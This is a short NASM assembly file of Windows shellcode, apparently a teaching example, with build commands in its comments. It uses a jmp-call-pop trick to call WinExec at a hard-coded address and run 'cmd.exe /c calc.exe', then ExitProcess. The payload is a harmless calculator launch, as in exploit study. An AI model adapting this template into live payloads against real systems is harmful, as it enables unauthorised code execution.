; simple example shellcode for Windows

; nasm -f elf32 win32shell.asm -o win32shell.o
; ld -m elf_i386 win32shell.o -o win32shell
; objdump -d -M intel win32shell
; ./sc.sh win32shell

    global _start
    section .text
_start:
    jmp short call_shellcode

shellcode_return:
    pop ebx                         ; get address of the string
    xor eax,eax                     ; zero out eax
    push eax                        ; null parameter for WinExec
    push ebx
    mov ebx,0x7c8623ad              ; address of WinExec for our target OS
    call ebx                        ; call WinExec(path,showcode)

    xor eax,eax                     ; zero the register again, clears winexec retval
    push eax                        ; push parameter for ExitProcess
    mov ebx, 0x7c81cafa             ; address of ExitProcess on target system
    call ebx                        ;call ExitProcess(0);

call_shellcode:
    call shellcode_return
    db "cmd.exe /c calc.exe"
    db 0x00